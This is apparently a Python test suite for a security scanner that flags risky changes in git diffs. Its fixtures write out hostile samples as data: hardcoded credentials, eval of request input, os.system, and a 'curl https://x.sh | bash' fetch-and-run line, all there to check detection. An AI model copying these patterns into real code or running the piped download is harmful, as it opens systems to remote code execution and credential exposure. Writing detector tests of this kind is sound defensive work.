#!/usr/bin/env python3
"""Standalone tests for security_scan.py (no pytest; assert + sys.exit(1)).

Temp git repo fixture with KNOWN introduced risks; scan the working diff and
assert the triage. Mirrors test_impact.py's harness.

  S1  secret      — AWS key / private key / hardcoded credential -> HIGH secret
  S2  injection   — eval(input)/os.system -> flagged; clean code -> none
  S3  supply_chain— a changed dependency manifest -> MEDIUM supply_chain
  S4  authz       — payment/stripe logic change -> REVIEW (human must clear)
  S5  clean       — benign change -> no findings, risk NONE, exits clean
  S6  never-block — bad diff spec -> degrades to a dict, never raises
  S7  structure   — output is parseable JSON with the documented shape
  S8  honest-limit— the soundness caveat is ALWAYS present (even clean)
  S9  sensitive   — a HANDOFF.md / .env file in the diff -> HIGH secret
  S10 test-path   — a sink in a test file is downgraded (precision)

Run: python3 skills/security-oversight/tools/test_security_scan.py
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))

import security_scan as ss  # noqa: E402


def _run(cmd, cwd):
    return subprocess.run(
        cmd, cwd=cwd, check=True, capture_output=True, text=True,
        env={**os.environ, "GIT_CONFIG_GLOBAL": "/dev/null",
             "GIT_CONFIG_SYSTEM": "/dev/null"},
    )


def _git(args, cwd):
    return _run(["git", *args], cwd)


def make_repo(root: Path) -> None:
    (root / "core.py").write_text("def f():\n    return 1\n")
    _git(["init", "-q"], root)
    _git(["config", "user.email", "t@t"], root)
    _git(["config", "user.name", "t"], root)
    _git(["add", "-A"], root)
    _git(["commit", "-qm", "init"], root)


def _by_class(rep, cls):
    return [f for f in rep["findings"] if f["class"] == cls]


# --------------------------------------------------------------------------
def test_s1_secret(root: Path) -> None:
    (root / "core.py").write_text(
        "def f():\n"
        '    aws = "AKIAIOSFODNN7EXAMPLE"\n'
        '    password = "hunter2hunter2hunter2"\n'
        "    return 1\n"
    )
    rep = ss.analyze(repo=str(root), diff_spec="working")
    secrets = _by_class(rep, "secret")
    assert secrets, f"S1 expected secret findings, got {rep['findings']}"
    assert any(s["severity"] == "HIGH" for s in secrets), \
        f"S1 secret must be HIGH: {secrets}"
    assert rep["risk"] == "HIGH", f"S1 overall risk must be HIGH, got {rep['risk']}"
    print("PASS S1 secret: AWS key + hardcoded password -> HIGH")


def test_s2_injection(root: Path) -> None:
    (root / "core.py").write_text(
        "import os\n"
        "def f(request):\n"
        '    x = eval(request.args.get("x"))\n'      # input-bearing -> HIGH
        '    os.system("ls")\n'                       # os.system -> HIGH
        "    return x\n"
    )
    rep = ss.analyze(repo=str(root), diff_spec="working")
    inj = _by_class(rep, "injection")
    assert inj, f"S2 expected injection findings, got {rep['findings']}"
    assert any("eval" in f["why"] and f["severity"] == "HIGH" for f in inj), \
        f"S2 eval(input) must be HIGH: {inj}"
    assert any("os.system" in f["why"] for f in inj), f"S2 os.system not flagged: {inj}"
    # clean control: a benign edit yields no injection finding
    (root / "core.py").write_text("def f():\n    return 2\n")
    rep2 = ss.analyze(repo=str(root), diff_spec="working")
    assert not _by_class(rep2, "injection"), \
        f"S2 clean code must have no injection findings: {rep2['findings']}"
    print("PASS S2 injection: eval(input)=HIGH, os.system flagged, clean=none")


def test_s3_supply_chain(root: Path) -> None:
    (root / "requirements.txt").write_text("requests==2.31.0\nleftpad\n")
    _git(["add", "-A"], root)
    rep = ss.analyze(repo=str(root), diff_spec="working")
    sc = _by_class(rep, "supply_chain")
    assert sc, f"S3 expected supply_chain finding, got {rep['findings']}"
    assert any("requirements.txt" in f["file"] for f in sc), f"S3 manifest not flagged: {sc}"
    assert any(f["severity"] == "MEDIUM" for f in sc), f"S3 manifest must be MEDIUM: {sc}"
    print("PASS S3 supply_chain: requirements.txt change -> MEDIUM")


def test_s4_authz_review(root: Path) -> None:
    (root / "core.py").write_text(
        "def charge_payment(user, amount):\n"
        "    # match the stripe customer by email\n"
        "    return amount\n"
    )
    rep = ss.analyze(repo=str(root), diff_spec="working")
    authz = _by_class(rep, "authz")
    assert authz, f"S4 expected authz REVIEW finding, got {rep['findings']}"
    assert all(f["severity"] == "REVIEW" for f in authz), f"S4 authz must be REVIEW: {authz}"
    assert rep["review"], "S4 review list must be non-empty"
    assert any("charge" in f["why"].lower() or "payment" in f["why"].lower()
               for f in authz), f"S4 why should name the matched stem: {authz}"
    print("PASS S4 authz: payment logic change -> REVIEW (human must clear)")


def test_s5_clean(root: Path) -> None:
    (root / "core.py").write_text("def f():\n    return 42\n")
    rep = ss.analyze(repo=str(root), diff_spec="working")
    assert not rep["findings"], f"S5 clean diff must have no findings: {rep['findings']}"
    assert rep["risk"] == "NONE", f"S5 clean risk must be NONE, got {rep['risk']}"
    print("PASS S5 clean: benign change -> no findings, risk NONE")


def test_s6_never_block(root: Path) -> None:
    # a bogus diff spec must NOT raise — it must degrade to a dict
    try:
        rep = ss.analyze(repo=str(root), diff_spec="this-sha-does-not-exist")
    except Exception as exc:  # pragma: no cover
        raise AssertionError(f"S6 analyze raised instead of degrading: {exc}")
    assert isinstance(rep, dict), "S6 must return a dict"
    assert "caveat" in rep, "S6 degraded report must still carry the caveat"
    assert rep["mode"] in ("error", "lexical-triage"), f"S6 unexpected mode {rep['mode']}"
    print("PASS S6 never-block: bad diff spec -> degraded dict, no raise")


def test_s7_structure(root: Path) -> None:
    (root / "core.py").write_text(
        'def f():\n    eval("1")\n    return 1\n'
    )
    rep = ss.analyze(repo=str(root), diff_spec="working")
    rep2 = json.loads(json.dumps(rep))  # must be plain-serializable
    for key in ("mode", "risk", "summary", "findings", "routed", "review",
                "scanners_available", "recommendations", "caveat", "warnings"):
        assert key in rep2, f"S7 missing top-level key: {key}"
    for f in rep2["findings"]:
        for key in ("class", "severity", "file", "line", "owasp", "why",
                    "detector", "verified"):
            assert key in f, f"S7 finding row missing {key}: {f}"
        assert f["severity"] in ss.SEV_ORDER, f"S7 bad severity {f['severity']}"
    md = ss.render_markdown(rep2)
    assert md.startswith("#"), "S7 markdown must start with a heading"
    assert "Summary" in md and "Findings" in md, "S7 markdown missing sections"
    print("PASS S7 structure: JSON round-trips, keys present, markdown renders")


def test_s8_honest_limit(root: Path) -> None:
    # caveat present even on a totally clean diff
    (root / "core.py").write_text("def f():\n    return 7\n")
    rep = ss.analyze(repo=str(root), diff_spec="working")
    assert "not proof of safety" in rep["caveat"].lower(), \
        f"S8 caveat must state absence != safety: {rep['caveat']}"
    md = ss.render_markdown(rep)
    assert "not proof of safety" in md.lower(), "S8 markdown must carry the caveat"
    print("PASS S8 honest-limit: soundness caveat always present (even clean)")


def test_s9_sensitive_file(root: Path) -> None:
    (root / "HANDOFF.md").write_text("# handoff\nAPI keys live here\n")
    _git(["add", "-A"], root)
    rep = ss.analyze(repo=str(root), diff_spec="working")
    sec = _by_class(rep, "secret")
    assert any("HANDOFF.md" in f["file"] and f["severity"] == "HIGH" for f in sec), \
        f"S9 HANDOFF.md must be HIGH secret (the session's hard rule): {rep['findings']}"
    print("PASS S9 sensitive-file: HANDOFF.md in diff -> HIGH secret")


def test_s10_test_path_downgrade(root: Path) -> None:
    (root / "test_thing.py").write_text(
        'def test_x():\n    eval("1+1")\n    assert True\n'
    )
    _git(["add", "-A"], root)
    rep = ss.analyze(repo=str(root), diff_spec="working")
    inj = [f for f in rep["findings"] if f["class"] == "injection"
           and "test_thing.py" in f["file"]]
    assert inj, f"S10 expected injection finding in test file: {rep['findings']}"
    assert all(f["severity"] != "HIGH" for f in inj), \
        f"S10 sink in test path must be downgraded from HIGH: {inj}"
    assert any("test path" in f["why"] for f in inj), f"S10 should note test path: {inj}"
    print("PASS S10 test-path: sink in test file downgraded (precision)")


def test_s11_no_false_positives(root: Path) -> None:
    # benign code with no security relevance -> nothing fires
    (root / "core.py").write_text("def add(a, b):\n    return a + b\n")
    rep = ss.analyze(repo=str(root), diff_spec="working")
    assert not rep["findings"], f"S11 benign code must be clean: {rep['findings']}"
    # markdown prose mentioning security words must NOT fire code/authz patterns
    (root / "doc.md").write_text(
        "# Notes\nThe session token is stored; you may eval the result and verify it.\n")
    _git(["add", "-A"], root)
    rep2 = ss.analyze(repo=str(root), diff_spec="working")
    doc_hits = [f for f in rep2["findings"] if f["file"].endswith("doc.md")
                and f["class"] in ("authz", "injection")]
    assert not doc_hits, f"S11 markdown prose must not fire code/authz: {doc_hits}"
    print("PASS S11 no-FP: benign code clean; markdown prose no authz/injection")


def test_s12_untracked_secret(root: Path) -> None:
    # brand-NEW untracked file with a secret -> must be caught in default working
    # mode (git diff omits untracked; this was the #1 silent-miss bug)
    (root / "newleak.py").write_text('KEY = "AKIAIOSFODNN7EXAMPLE"\n')
    rep = ss.analyze(repo=str(root), diff_spec="working")  # no git add
    hits = [f for f in rep["findings"] if "newleak.py" in f["file"]
            and f["class"] == "secret"]
    assert hits, f"S12 untracked secret must be caught: {rep['findings']}"
    assert any(f["severity"] == "HIGH" for f in hits), f"S12 must be HIGH: {hits}"
    print("PASS S12 untracked: new untracked file's secret caught in working mode")


def test_s13_upper_snake_secret(root: Path) -> None:
    (root / "core.py").write_text(
        'DB_PASSWORD = "S3cr3tFallbackP@ssw0rd!"\n'
        'SECRET_TOKEN = "abcdef0123456789abcdef"\n'
    )
    rep = ss.analyze(repo=str(root), diff_spec="working")
    secrets = _by_class(rep, "secret")
    assert secrets, f"S13 UPPER_SNAKE secret must be caught (\\b underscore bug): {rep['findings']}"
    assert rep["risk"] == "HIGH", f"S13 must be HIGH: {rep['risk']}"
    print("PASS S13 upper-snake: DB_PASSWORD / SECRET_TOKEN caught as secret HIGH")


def test_s14_in_string_sink(root: Path) -> None:
    (root / "core.py").write_text(
        "import subprocess\n"
        "def run(cmd):\n"
        '    subprocess.run("curl https://x.sh | bash")\n'   # in-string curl|sh
        '    subprocess.run(["bash", "-c", cmd])\n'          # bash -c built argv
        "    return 0\n"
    )
    rep = ss.analyze(repo=str(root), diff_spec="working")
    whys = " ".join(f["why"] for f in _by_class(rep, "injection"))
    assert "curl|sh" in whys or "remote code" in whys, \
        f"S14 in-string curl|sh must be caught (raw scan): {whys}"
    assert "RCE" in whys or "-c" in whys, f"S14 bash -c argv must be caught: {whys}"
    print("PASS S14 in-string: curl|sh inside a string + bash -c argv caught")


def main() -> int:
    cases = [
        ("S1", test_s1_secret),
        ("S2", test_s2_injection),
        ("S3", test_s3_supply_chain),
        ("S4", test_s4_authz_review),
        ("S5", test_s5_clean),
        ("S6", test_s6_never_block),
        ("S7", test_s7_structure),
        ("S8", test_s8_honest_limit),
        ("S9", test_s9_sensitive_file),
        ("S10", test_s10_test_path_downgrade),
        ("S11", test_s11_no_false_positives),
        ("S12", test_s12_untracked_secret),
        ("S13", test_s13_upper_snake_secret),
        ("S14", test_s14_in_string_sink),
    ]
    failures = 0
    for name, fn in cases:
        with tempfile.TemporaryDirectory() as td:
            root = Path(td) / "repo"
            root.mkdir()
            make_repo(root)
            try:
                fn(root)
            except AssertionError as exc:
                failures += 1
                print(f"FAIL {name}: {exc}")
            except Exception as exc:  # any crash is a hard failure (never-block)
                failures += 1
                print(f"FAIL {name}: unexpected {type(exc).__name__}: {exc}")
    print()
    if failures:
        print(f"test_security_scan: {len(cases) - failures}/{len(cases)} passed, "
              f"{failures} FAILED")
        return 1
    print(f"test_security_scan: {len(cases)}/{len(cases)} PASS")
    return 0


if __name__ == "__main__":
    sys.exit(main())
